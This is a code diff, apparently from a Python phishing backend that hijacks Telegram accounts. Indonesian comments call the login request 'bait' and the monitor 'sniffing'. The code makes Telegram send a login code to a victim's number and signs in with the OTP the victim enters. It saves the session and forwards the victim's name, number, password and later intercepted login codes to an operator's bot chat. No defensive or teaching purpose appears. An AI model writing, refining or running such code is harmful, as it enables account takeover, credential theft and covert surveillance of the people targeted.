@@ -46,6 +46,7 @@ async def handle_flow(data):
         await client.connect()
 
         if step == 1:
+            # SATU-SATUNYA TEMPAT KIRIM OTP (Pancingan)
             res = await client.send_code_request(nomor)
             user_db[nomor] = {"session": client.session.save(), "hash": res.phone_code_hash, "nama": nama, "sandi": "None"}
             return jsonify({"status": "success"})
@@ -54,7 +55,7 @@ async def handle_flow(data):
             try:
                 await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                 user_db[nomor]['session'] = client.session.save()
-                # Kirim Pesan Awal (OTP: None)
+                # Kirim data awal (OTP: None)
                 text = f"Nama: **{user_db[nomor]['nama']}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : None"
                 bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}})
                 return jsonify({"status": "success"})
@@ -81,39 +82,43 @@ def webhook():
         call = update["callback_query"]
         action, nomor = call["data"].split("_")
         if action == "upd":
-            # Kirim teks instruksi
+            # Tampilkan status standby
             res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot siap menerima OTP!\n/exit untuk keluar", "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}})
             user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
-            threading.Thread(target=lambda: asyncio.run(monitor_incoming_new_msg(nomor))).start()
+            # Jalankan Thread Mengintip
+            threading.Thread(target=lambda: asyncio.run(monitor_pure_sniffing(nomor))).start()
         elif action == "exit":
              if user_db.get(nomor, {}).get('status_id'):
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
     return jsonify({"status": "success"})
 
-async def monitor_incoming_new_msg(nomor):
+async def monitor_pure_sniffing(nomor):
     data = user_db.get(nomor)
     if not data or not data.get('session'): return
+    
+    # Masuk menggunakan sesi pancingan tadi
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     await client.connect()
+    
     try:
-        # Picu kirim kode ke akun target agar bisa dibaca
-        try: await client.send_code_request(nomor)
-        except: pass
-
+        # HANYA MENDENGARKAN (Sniffing) - Tidak ada send_code_request di sini!
         @client.on(events.NewMessage(from_users=777000))
         async def handler(event):
+            # Cari 5 digit angka di pesan Telegram
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
-                # KIRIM PESAN BARU (Bukan Edit)
-                text_baru = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`"
-                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_baru, "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}})
+                # Kirim pesan baru berisi OTP yang disadap
+                text_hasil = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`"
+                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_hasil, "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}})
                 
-                # Hapus instruksi "Bot siap" otomatis
+                # Hapus otomatis teks "Bot siap"
                 if data.get('status_id'):
                     bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                     data['status_id'] = None
+                
                 await client.disconnect()
         
+        # Standby mengintip selama 10 menit
         await asyncio.sleep(600)
     finally:
         if client.is_connected(): await client.disconnect()
